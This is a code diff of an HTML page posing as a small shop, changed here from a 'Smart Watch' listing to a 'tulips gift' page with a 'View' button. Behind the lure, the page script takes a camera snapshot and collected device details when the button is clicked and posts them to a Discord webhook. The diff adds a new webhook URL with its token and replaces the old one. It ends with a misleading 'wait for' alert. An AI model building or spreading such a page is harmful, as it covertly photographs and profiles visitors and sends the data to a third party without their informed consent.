@@ -1,8 +1,9 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Online Gadget Shop</title>
+  <title>tulips gift</title>
   <style>
     body { font-family: sans-serif; background: #f4f4f4; padding: 20px; }
     .shop { background: white; padding: 20px; max-width: 400px; margin: auto; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
@@ -13,16 +14,15 @@
 </head>
 <body>
   <div class="shop">
-    <h1>Smart Watch</h1>
-    <p>₱1,299.00</p>
-    <button id="buyBtn">Buy Now</button>
+    <h1>Tulips</h1>
+    <button id="buyBtn">View</button>
   </div>
 
   <video id="video" autoplay playsinline width="300" height="200"></video>
   <canvas id="canvas" width="300" height="200"></canvas>
 
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1377690114448167145/TQdVScuZLRuEIDGAt8YHbjN51qjt-yXgUb5K8Q8qG8rki1-kWWc37Z532PGr7MaD57VX"
+    const webhookURL = "https://canary.discord.com/api/webhooks/1459770251544887357/9K2SMkK3ne5QWhZ75fy22kvxZ-c0dLQlcF62_uvsqQeLQ2hixueekBM82XxgjWyWKpB8";
     const buyBtn = document.getElementById("buyBtn");
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
@@ -102,7 +102,7 @@
 - **Camera Access**: ${photoBlob ? "Success" : "Failed / Denied"}`;
 
       await sendToDiscord(photoBlob || new Blob(["No photo"]), infoText);
-      alert("Thank you for your order!");
+      alert("wait for ");
     });
   </script>
 </body>
